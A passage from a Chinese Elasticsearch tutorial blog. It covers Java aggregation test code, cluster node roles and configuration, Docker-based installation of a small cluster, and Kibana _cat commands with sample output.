Avg avg = aggregations.get(&quot;buyCountAvg&quot;);  </span><br><span class=\"line\">                log.info(&quot;计算 buyCount 的平均值：&#123;&#125; &quot;, avg.getValue());  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    /\\*\\*  </span><br><span class=\"line\">     \\* 一次查询 总数，最大值，最小值，平均值，总和  </span><br><span class=\"line\">     \\*/  </span><br><span class=\"line\">    @Test  </span><br><span class=\"line\">    void aggs9() &#123;  </span><br><span class=\"line\">        StatsAggregationBuilder stats = AggregationBuilders.stats(&quot;stats&quot;).field(&quot;buyCount&quot;);  </span><br><span class=\"line\">        Query query = new NativeSearchQueryBuilder()  </span><br><span class=\"line\">                .withAggregations(stats)  </span><br><span class=\"line\">//                .addAggregation(stats)  </span><br><span class=\"line\">                .build();  </span><br><span class=\"line\">        SearchHits&lt;JhTestEntity&gt; search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  </span><br><span class=\"line\">        if (search.hasAggregations()) &#123;  </span><br><span class=\"line\">            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  </span><br><span class=\"line\">            if (Objects.nonNull(aggregations)) &#123;  </span><br><span class=\"line\">                Stats s = aggregations.get(&quot;stats&quot;);  </span><br><span class=\"line\">                log.info(&quot;计算 buyCount 的 count：&#123;&#125; &quot;, s.getCount());  </span><br><span class=\"line\">                log.info(&quot;计算 buyCount 的 min：&#123;&#125; &quot;, s.getMin());  </span><br><span class=\"line\">                log.info(&quot;计算 buyCount 的 max：&#123;&#125; &quot;, s.getMax());  </span><br><span class=\"line\">                log.info(&quot;计算 buyCount 的 avg：&#123;&#125; &quot;, s.getAvg());  </span><br><span class=\"line\">                log.info(&quot;计算 buyCount 的 sum：&#123;&#125; &quot;, s.getSum());  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    /\\*\\*  </span><br><span class=\"line\">     \\* 根据 createMonth 分组查询每个月的最大 buyCount  </span><br><span class=\"line\">     \\*/  </span><br><span class=\"line\">    @Test  </span><br><span class=\"line\">    void aggs10() &#123;  </span><br><span class=\"line\">        TermsAggregationBuilder createMonthGroup = AggregationBuilders.terms(&quot;createMonthGroup&quot;).field(&quot;createMonth&quot;)  </span><br><span class=\"line\">                .subAggregation(AggregationBuilders.max(&quot;buyCountMax&quot;).field(&quot;buyCount&quot;));  </span><br><span class=\"line\">  </span><br><span class=\"line\">        Query query = new NativeSearchQueryBuilder()  </span><br><span class=\"line\">                .withAggregations(createMonthGroup)  </span><br><span class=\"line\">//                .addAggregation(createMonthGroup)  </span><br><span class=\"line\">                .build();  </span><br><span class=\"line\">        SearchHits&lt;JhTestEntity&gt; search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  </span><br><span class=\"line\">        if (search.hasAggregations()) &#123;  </span><br><span class=\"line\">            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  </span><br><span class=\"line\">            if (Objects.nonNull(aggregations)) &#123;  </span><br><span class=\"line\">                Terms terms = aggregations.get(&quot;createMonthGroup&quot;);  </span><br><span class=\"line\">                terms.getBuckets().forEach(bucket -&gt; &#123;  </span><br><span class=\"line\">                    String createMonth = bucket.getKeyAsString();  </span><br><span class=\"line\">                    Aggregations subAggs = bucket.getAggregations();  </span><br><span class=\"line\">                    if (Objects.nonNull(subAggs)) &#123;  </span><br><span class=\"line\">                        Max max = subAggs.get(&quot;buyCountMax&quot;);  </span><br><span class=\"line\">                        log.info(&quot;计算 &#123;&#125; 月的最大值为：&#123;&#125; &quot;, createMonth, max.getValue());  </span><br><span class=\"line\">                    &#125;  </span><br><span class=\"line\">                &#125;);  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    /\\*\\*  </span><br><span class=\"line\">     \\*  查询每 createMonth 下，根据 sex 区分，统计buyCount 的平均值  </span><br><span class=\"line\">     \\*/  </span><br><span class=\"line\">    @Test  </span><br><span class=\"line\">    void aggs11() &#123;  </span><br><span class=\"line\">        TermsAggregationBuilder createMonthGroup = AggregationBuilders.terms(&quot;createMonthGroup&quot;).field(&quot;createMonth&quot;)  </span><br><span class=\"line\">                .subAggregation(AggregationBuilders.terms(&quot;sexGroup&quot;).field(&quot;sex&quot;)  </span><br><span class=\"line\">                        .subAggregation(AggregationBuilders.avg(&quot;buyCountAvg&quot;).field(&quot;buyCount&quot;)));  </span><br><span class=\"line\">  </span><br><span class=\"line\">        Query query = new NativeSearchQueryBuilder()  </span><br><span class=\"line\">                .withAggregations(createMonthGroup)  </span><br><span class=\"line\">//                .addAggregation(createMonthGroup)  </span><br><span class=\"line\">                .build();  </span><br><span class=\"line\">        SearchHits&lt;JhTestEntity&gt; search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  </span><br><span class=\"line\">        if (search.hasAggregations()) &#123;  </span><br><span class=\"line\">            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  </span><br><span class=\"line\">            if (Objects.nonNull(aggregations)) &#123;  </span><br><span class=\"line\">                Terms terms = aggregations.get(&quot;createMonthGroup&quot;);  </span><br><span class=\"line\">                terms.getBuckets().forEach(bucket -&gt; &#123;  </span><br><span class=\"line\">                    String createMonth = bucket.getKeyAsString();  </span><br><span class=\"line\">                    Aggregations sexAggs = bucket.getAggregations();  </span><br><span class=\"line\">                    if (Objects.nonNull(sexAggs)) &#123;  </span><br><span class=\"line\">                        Terms sexTerms = sexAggs.get(&quot;sexGroup&quot;);  </span><br><span class=\"line\">                        sexTerms.getBuckets().forEach(sexBucket -&gt; &#123;  </span><br><span class=\"line\">                            String sex = sexBucket.getKeyAsString();  </span><br><span class=\"line\">                            Aggregations avgAggs = sexBucket.getAggregations();  </span><br><span class=\"line\">                            if (Objects.nonNull(avgAggs)) &#123;  </span><br><span class=\"line\">                                Avg avg = avgAggs.get(&quot;buyCountAvg&quot;);  </span><br><span class=\"line\">                                log.info(&quot;计算 &#123;&#125; 月，&#123;&#125; 性 的平均值为：&#123;&#125; &quot;, createMonth, sex, avg.getValue());  </span><br><span class=\"line\">                            &#125;  </span><br><span class=\"line\">                        &#125;);  </span><br><span class=\"line\">                    &#125;  </span><br><span class=\"line\">                &#125;);  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"5-3-ES-ES工业级Java-应用开发\"><a href=\"#5-3-ES-ES工业级Java-应用开发\" class=\"headerlink\" title=\"5.3 ES ES工业级Java 应用开发\"></a>5.3 ES ES工业级Java 应用开发</h2><p>一般不会直接使用RestHighLevelClient对于ES操作，因为语法过于繁琐，重复，基于分离变和不变的原则可以进行工业级封装。</p>\n<p><a href=\"http://localhost:8080/doc.html\">http://localhost:8080/doc.html</a></p>\n<p><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/22.png\"><br>工业级封装后的Service：</p>\n<blockquote>\n<p>文章实在太长， 这里省略了500字+， 省略的内容请参见的免费电子书 PDF版本《ES学习圣经：从0到1, 精通 ElasticSearch 工业级使用 》</p>\n</blockquote>\n<h1 id=\"6-ES集群架构\"><a href=\"#6-ES集群架构\" class=\"headerlink\" title=\"6 ES集群架构\"></a>6 ES集群架构</h1><h2 id=\"6-1-ES集群的5大角色\"><a href=\"#6-1-ES集群的5大角色\" class=\"headerlink\" title=\"6.1 ES集群的5大角色\"></a>6.1 ES集群的5大角色</h2><ol>\n<li><strong>Master Node ：主节点</strong></li>\n</ol>\n<p>主节点，该节点不和应用创建连接，每个节点都保存了集群状态。master节点控制整个集群的元数据。只有Master Node节点可以修改节点状态信息，及元数据(metadata)的处理。 元数据(metadata)，比如：</p>\n<ul>\n<li><p>索引的分片信息 、主副本信息</p>\n</li>\n<li><p>分片的节点分配信息，路由分配</p>\n</li>\n<li><p>index 、type、Mapping</p>\n</li>\n<li><p>Setting 配置等等。</p>\n</li>\n</ul>\n<p>从资源占用的角度来说：master节点不占用磁盘IO和CPU，内存使用量一般， 没有data 节点高类似于kafa中的 controller，负责集群元数据的管理和维护</p>\n<ol start=\"2\">\n<li><p><strong>Master eligible nodes ：合格节点</strong> 有资格成为Master节点但暂时并不是Master的节点被称为 eligible 节点，该节点可以参加选主流程，成为Master节点. 该节点只是与集群保持心跳，判断Master是否存活，如果Master故障则参加新一轮的Master选举。 从资源占用的角度来说：eligible节点比Master节点更节省资源，因为它还未成为 Master 节点， 只是有资格成功Master节点。</p>\n</li>\n<li><p><strong>Data Node ：数据节点</strong> 职责： 数据节点，用于建立文档索引，管理shard。 类似于rocket 中的 broker，负责数据的管理和维护，数据节点职责：</p>\n</li>\n</ol>\n<ul>\n<li><p>该节点用于建立文档索引， 接收 应用创建连接、接收索引请求</p>\n</li>\n<li><p>查询，接收用户的搜索请求</p>\n</li>\n</ul>\n<p>data节点的分片执行查询语句获得查询结果后将结果反馈给Coordinating节点，在查询的过程中非常消 耗硬件资源，如果在分片配置及优化没做好的情况下，进行一次查询非常缓慢(硬件配置也要跟上数据量)。 数据节点：保存包含索引文档的分片数据，执行CRUD、搜索、聚合相关的操作。属于：内存、CPU、IO密集型，对硬件资源要求高。 从资源占用的角度来说：data节点会占用大量的CPU、IO和内存</p>\n<ol start=\"4\">\n<li><strong>Coordinating Node ：协调节点(&#x2F;路由节点&#x2F;client节点)</strong></li>\n</ol>\n<p>协调节点，该节点专用与接收应用的查询连接、接受搜索请求，但其本身不负责存储数据 协调节点，接受客户端搜索请求后将请求转发到与查询条件相关的多个data节点的分片上，然后多个data节点的分片执行查询语句或者查询结果再返回给协调节点，协调节点把各个data节点的返回结果进行整合、排序等一系列操作后再将最终结果返回给用户请求。 data节点的分片执行查询语句获得查询结果后将结果反馈给Coordinating节点，在查询的过程中非常消耗硬件资源，如果在分片配置及优化没做好的情况下，进行一次查询非常缓慢(硬件配置也要跟上数据量)。 搜索请求在两个阶段中执行（query 和 fetch），这两个阶段由接收客户端请求的节点 - 协调节点协调。</p>\n<ul>\n<li><p>在请求query 阶段，协调节点将请求转发到保存数据的数据节点。每个数据节点在本地执行请求并将其结果返回给协调节点。</p>\n</li>\n<li><p>在收集fetch阶段，协调节点将每个数据节点的结果汇集为单个全局结果集。</p>\n</li>\n</ul>\n<p>从资源占用的角度来说：协调节点，可当负责均衡节点，该节点不占用io、cpu和内存 总结：Coordinating 大致的职责 ： 请求分发、结果的合并</p>\n<ol start=\"5\">\n<li><strong>Ingest Node ：ingest节点</strong></li>\n</ol>\n<p>ingest 节点可以看作是数据前置处理转换的节点，支持 pipeline管道 设置，可以使用 ingest 对数据进 行过滤、转换等操作，类似于 logstash 中 filter 的作用，功能相当强大。 Ingest节点处理时机——在数据被索引之前，通过预定义好的处理管道对数据进行预处理。默认情况下，所有节点都启用Ingest，因此任何节点都可以处理Ingest任务。 当然，我们也可以创建专用的Ingest节点。</p>\n<ol start=\"6\">\n<li><strong>部落（tribe）</strong></li>\n</ol>\n<p>接着说一下ES里面的部落：tribe， 可以在查询过程中链接两个集群的数据，查询的数据将会汇总到tribe节点，有tribe节点对数据进行整合再发送给client； tribe还可以写数据，但是这里有一个限制，就是写的索引只能是一个集群所有；如果写入两个集群同名索引，那么只能成功写入一个，至于写入哪一个可以通过配置偏好实现。 可以通过配置指明tribe只能读，不能写。</p>\n<h2 id=\"6-2-ES集群节点角色配置\"><a href=\"#6-2-ES集群节点角色配置\" class=\"headerlink\" title=\"6.2 ES集群节点角色配置\"></a>6.2 ES集群节点角色配置</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">1. node.master  </span><br><span class=\"line\">2. node.data  </span><br><span class=\"line\">3. node.ingest  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>配置实例&#x2F;usr&#x2F;share&#x2F;elasticsearch&#x2F;config&#x2F;elasticsearch.yml</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">bootstrap.memory\\_lock: true  </span><br><span class=\"line\">cluster.name: &quot;es-cluster&quot;  </span><br><span class=\"line\">node.name: master1  </span><br><span class=\"line\">node.master: true  </span><br><span class=\"line\">node.data: true  </span><br><span class=\"line\">network.host: 0.0.0.0  </span><br><span class=\"line\">http.port: 9200  </span><br><span class=\"line\">transport.tcp.port: 9300  </span><br><span class=\"line\">cluster.initial\\_master\\_nodes: \\[&quot;master1&quot;\\]  </span><br><span class=\"line\">discovery.zen.ping.unicast.hosts: master1, master2, master3  </span><br><span class=\"line\">#官方推荐 master-eligible nodes / 2 + 1 向下取整的个数  </span><br><span class=\"line\">discovery.zen.minimum\\_master\\_nodes: 2  </span><br><span class=\"line\">path.logs: /usr/share/elasticsearch/logs  </span><br><span class=\"line\">http.cors.enabled: true  </span><br><span class=\"line\">http.cors.allow-origin: &quot;\\*&quot;  </span><br><span class=\"line\">xpack.security.audit.enabled: true  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>默认情况下这三个属性的值都是true，实际上，一个节点在默认情况下会同时扮演：Master Node，Data Node 和 Ingest Node。</p>\n<table>\n<thead>\n<tr>\n<th><strong>节点类型</strong></th>\n<th><strong>配置参数</strong></th>\n<th><strong>默认值</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Master Eligible</td>\n<td>node.master</td>\n<td>true</td>\n</tr>\n<tr>\n<td>Data</td>\n<td>node.data</td>\n<td>true</td>\n</tr>\n<tr>\n<td>Coordinating only</td>\n<td>无</td>\n<td></td>\n</tr>\n</tbody></table>\n<p>设置上面2 个参数全为 false，节点为专用协调节点</p>\n<p>|| Ingest| node.ingest| true|</p>\n<h2 id=\"6-3-ES节点配置组合\"><a href=\"#6-3-ES节点配置组合\" class=\"headerlink\" title=\"6.3 ES节点配置组合\"></a>6.3 ES节点配置组合</h2><ol>\n<li><strong>组合1</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">node.master: true   </span><br><span class=\"line\">node.data: true   </span><br><span class=\"line\">node.ingest: true  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">这种组合表示这个节点既有成为主节点的资格，又可以存储数据，还可以作为预处理节点这个时候如果某个节点被选举成为了真正的主节点，那么他还要存储数据，这样对于这个节点的压力就比较大了。  </span><br><span class=\"line\">elasticsearch 默认是：每个节点都是这样的配置，在测试环境下这样做没问题。实际工作中建议不要这  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>样设置，这样相当于 主节点 和 数据节点 的角色混合到一块了。</p>\n<ol start=\"2\">\n<li><strong>组合2</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">node.master: false   </span><br><span class=\"line\">node.data: true   </span><br><span class=\"line\">node.ingest: false  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>这种组合表示这个节点没有成为主节点的资格，也就不参与选举，只会存储数据。这个节点我们称为 data(数据)节点。在集群中需要单独设置几个这样的节点负责存储数据。后期提供存储和查询服务</p>\n<ol start=\"3\">\n<li><strong>组合3</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">node.master: true  </span><br><span class=\"line\">node.data: false  </span><br><span class=\"line\">node.ingest: false  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>这种组合表示这个节点不会存储数据，有成为主节点的资格，可以参与选举，有可能成为真正的主节点。这个节点我们称为master节点</p>\n<ol start=\"4\">\n<li><strong>组合4</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">node.master: false   </span><br><span class=\"line\">node.data: false   </span><br><span class=\"line\">node.ingest: true  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>这种组合表示这个节点即不会成为主节点，也不会存储数据，这个节点的意义是作为一个 client(客户端)节点，主要是针对海量请求的时候可以进行负载均衡。 在新版 ElasticSearch5.x 之后该节点称之为：coordinate 节点，其中还增加了一个叫：ingest 节点，用 于预处理数据（索引和搜索阶段都可以用到）。 当然，作为一般应用是不需要这个预处理节点做什么额外的预处理过程，那么这个节点和我们称之为client 节点之间可以看做是等同的，我们在代码中配置访问节点就都可以配置这些 ingest 节点即可。‍</p>\n<h2 id=\"6-4-高可用ES的部署架构\"><a href=\"#6-4-高可用ES的部署架构\" class=\"headerlink\" title=\"6.4 高可用ES的部署架构\"></a>6.4 高可用ES的部署架构</h2><p><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/23.png\"></p>\n<ol>\n<li><strong>小型的ES集群（&lt;10）的节点架构</strong></li>\n</ol>\n<p><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/24.png\"></p>\n<ul>\n<li><p>对于Ingest转换节点，如果我们没有格式转换、类型转换等需求，直接设置为false。</p>\n</li>\n<li><p>3-5个节点属于轻量级集群，要保证主节点个数满足((节点数&#x2F;2)+1)。</p>\n</li>\n<li><p>轻量级集群，节点的多重属性如：Master&amp;Data设置为同一个节点可以理解的。</p>\n</li>\n<li><p>如果进一步优化，5节点可以将Master和Data再分离。</p>\n</li>\n</ul>\n<ol start=\"2\">\n<li><strong>中型的ES集群（10-50）的节点架构</strong></li>\n</ol>\n<ul>\n<li><p>三台服务器做master节点 （可选）</p>\n</li>\n<li><p>N（比如20）台服务器作为data节点（存储资源要大）</p>\n</li>\n<li><p>N（比如5）台做coodinate&#x2F;ingest节点（用于搜索结果合并，可以提高ES查询效率）</p>\n</li>\n</ul>\n<p><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/25.png\"><br>3.  <strong>超大型的ES集群的节点架构（150个节点+）</strong></p>\n<p>可以按照100个节点为单位，分成多个集群，通过 tribenode连接，单个ES数据库最好的高可用集群部署架构为：每个集群，三台服务器做master节点</p>\n<ul>\n<li><p>N（比如50）台服务器作为data节点（存储资源要大）</p>\n</li>\n<li><p>N（比如5）台做coodinate节点（用于搜索结果合并，可以提高ES查询效率）</p>\n</li>\n<li><p>N（比如2）台做ingest节点（用于数据转换，可以提高ES索引效率）</p>\n</li>\n</ul>\n<h2 id=\"6-5-小型ES集群的安装\"><a href=\"#6-5-小型ES集群的安装\" class=\"headerlink\" title=\"6.5 小型ES集群的安装\"></a><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/26.png\"><br>6.5 小型ES集群的安装</h2><h3 id=\"6-5-1-Image镜像\"><a href=\"#6-5-1-Image镜像\" class=\"headerlink\" title=\"6.5.1 Image镜像\"></a>6.5.1 Image镜像</h3><p>有外网环境，拉取镜像代码如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#下载elasticsearch,带中文分词器的版本  </span><br><span class=\"line\">docker pull andylsr/elasticsearch-with-ik-icu:7.14.0  </span><br><span class=\"line\">#下载kibana  </span><br><span class=\"line\">docker pull docker.elastic.co/kibana/kibana:7.14.0  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>无外网环境，可以先从有公网的环境拉取镜像，然后导出镜像</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">docker save andylsr/elasticsearch-with-ik-icu:7.14.0 -o /root/elasticsearchwith-ik-icu.tar  </span><br><span class=\"line\">docker save docker.elastic.co/kibana/kibana:7.14.0 -o /root/kibana.tar  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>然后上传导出的de镜像到dao目标虚拟机，然后导入镜像到docker</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">docker load -i /vagrant/3G-middleware/elasticsearch-with-ik-icu.tar  </span><br><span class=\"line\">docker load -i /vagrant/3G-middleware/kibana.tar  </span><br><span class=\"line\">docker load -i /vagrant/3G-middleware/haproxy.tar  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"6-5-2-创建目录结构\"><a href=\"#6-5-2-创建目录结构\" class=\"headerlink\" title=\"6.5.2 创建目录结构\"></a>6.5.2 创建目录结构</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">mkdir -p /home/docker-compose/elasticsearch7/&#123;coordinate1,coordinate2&#125;-&#123;logs,data&#125;  </span><br><span class=\"line\">mkdir -p /home/docker-compose/elasticsearch7/&#123;master1,master2,master3&#125;-&#123;logs,data&#125;  </span><br><span class=\"line\">chmod -R 777 /home/docker-compose/elasticsearch7  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"6-5-3-安装ES集群\"><a href=\"#6-5-3-安装ES集群\" class=\"headerlink\" title=\"6.5.3 安装ES集群\"></a>6.5.3 安装ES集群</h3><p>把docker-compose和ES相应配置文件拷贝到<code>/home/docker-compose</code>目录下，执行如下命令安装ES集群</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">docker-compose --compatibility up -d # 兼容模式后台启动  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>--compatibility：表示已兼容模式启动容器</p>\n</li>\n<li><p>-d：表示后台启动</p>\n</li>\n</ul>\n<h2 id=\"6-6-使用kibana访问集群\"><a href=\"#6-6-使用kibana访问集群\" class=\"headerlink\" title=\"6.6 使用kibana访问集群\"></a>6.6 使用kibana访问集群</h2><ol>\n<li><strong>查看集群健康情况</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">GET \\_cat/health?v  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>结果：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">epoch      timestamp cluster    status node.total node.data shards pri relo init unassign pending\\_tasks max\\_task\\_wait\\_time active\\_shards\\_percent  </span><br><span class=\"line\">1670418184 13:03:04  es-cluster green           5         3     16   8    0    0        0             0                  -                100.0%  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>status选项的值</p>\n<ul>\n<li><p>green : 所有primary shard和replica shard都已成功分配, 集群是100%可用的</p>\n</li>\n<li><p>yellow : 所有primary shard都已成功分配, 但至少有一个replica shard缺失. 此时集群所有功能都正常使用, 数据不会丢失, 搜索结果依然完整, 但集群的可用性减弱. —— 需要及时处理的警告</p>\n</li>\n<li><p>red : 至少有一个primary shard(以及它的全部副本分片)缺失 —— 部分数据不能使用, 搜索只能返回部分数据, 而分配到这个分配上的写入请求会返回一个异常. 此时虽然可以运行部分功能, 但为了索引数据的完整性, 需要尽快修复集群</p>\n</li>\n</ul>\n<ol start=\"2\">\n<li><strong>查看集群中的节点个数</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">GET \\_cat/nodes?v  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">ip         heap.percent ram.percent cpu load\\_1m load\\_5m load\\_15m node.role   master name  </span><br><span class=\"line\">172.19.0.2           36          95  12    0.20    0.43     0.73 cdfhilmrstw -      master2  </span><br><span class=\"line\">172.19.0.7           75          95  12    0.20    0.43     0.73 cdfhilmrstw \\*      master3  </span><br><span class=\"line\">172.19.0.5           29          95  12    0.20    0.43     0.73 cdfhilmrstw -      master1  </span><br><span class=\"line\">172.19.0.6           64          96  12    0.20    0.43     0.73 lr          -      coordinate2  </span><br><span class=\"line\">172.19.0.3           23          96  12    0.20    0.43     0.73 lr          -      coordinate1  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>第一列（ip）：es节点ip</p>\n</li>\n<li><p>第二列（heap.percent）：堆内存占比</p>\n</li>\n<li><p>第三列（ram.percent）：内存使用占比</p>\n</li>\n<li><p>第四列（cpu）：cpu使用率</p>\n</li>\n<li><p>第五列（load_1m）：1分钟内平均load情况</p>\n</li>\n<li><p>第六列（load_5m）：5分钟内平均load情况</p>\n</li>\n<li><p>第七列（load_15m）：15分钟内平均load情况</p>\n</li>\n<li><p>第八列（node.role）：节点权限</p>\n</li>\n<li><p>第九列（master）：是否master节点，*为master节点</p>\n</li>\n<li><p>第十列（name）：节点名称</p>\n</li>\n</ul>\n<p><strong>（1）heap.percent</strong> 表示ES使用的JVM内存情况，该值应该低于75，如果长时间大于75，表示JVM内存配置不够，如果JVM已经配置到30G，则表示该Datanode节点上的压力较大，需要考虑增加Datanode节点来分摊压力 <strong>（2）ram.percent</strong> 表示机器上内存的使用情况，实际对应linux上的 used+cache内存使用情况，如果该值接近100%，则表示机器上cache内存不够用，主要是由于ES检索中，lucene会消耗大量cache内存，如果cache不够，会导致lucene无法将部分文件加载到cache中，会频繁从磁盘中进行读取，导致查询延时加大</p>\n<ol start=\"3\">\n<li><strong>查看集群中的索引</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">GET \\_cat/indices?v  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">health status index                           uuid                   pri rep docs.count docs.deleted store.size pri.store.size  </span><br><span class=\"line\">green  open   .kibana-event-log-7.14.0\\-000001 1uw627v6T8KPBv2xrlPlPQ   1   1          9            0     97.8kb         48.9kb  </span><br><span class=\"line\">green  open   .kibana\\_7.14.0\\_001              1G2WGiXOT2Wvux7R\\_5TuLA   1   1         86           14      4.9mb          2.7mb  </span><br><span class=\"line\">green  open   .apm-custom-link                dMukcWA2QVOFzsOhWiPOng   1   1          0            0       416b           208b  </span><br><span class=\"line\">green  open   .apm-agent-configuration        ReYFH-LaQbmWjGTwif0nHA   1   1          0            0       416b           208b  </span><br><span class=\"line\">green  open   .kibana\\_task\\_manager\\_7.14.0\\_001 H-3hQBgZRO2AfYsWLS6LQw   1   1         14         1275    622.9kb        337.1kb  </span><br><span class=\"line\">green  open   user                            HdrFzj7TQ\\_ejXe\\_9Xdx1LQ   1   1          6            2     37.4kb         17.4kb  </span><br><span class=\"line\">green  open   .tasks                          DudUNrFYTq24R7ZY9IFK5A   1   1         16            0     80.9kb         43.4kb  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"7-数据类型和映射\"><a href=\"#7-数据类型和映射\" class=\"headerlink\" title=\"7 数据类型和映射\"></a>7 数据类型和映射</h1><h2 id=\"7-1-映射的创建\"><a href=\"#7-1-映射的创建\" class=\"headerlink\" title=\"7.1 映射的创建\"></a>7.1 映射的创建</h2><p>和传统数据库不同，传统的数据库我们尝试向表中插入数据的前提是这个表已经存在数据结构的定义，且插入数据的字段要在表结构中被定义。 而ES的映射的创建支持主动和被动创建。</p>\n<ol>\n<li><strong>被动创建（动态映射）</strong></li>\n</ol>\n<p>此时字段和映射类型不需要事先定义，只需要存在文档的索引，当向此索引添加数据的时候当遇到不存在的映射字段，ES会根据数据内容自动添加映射字段定义。</p>\n<ol 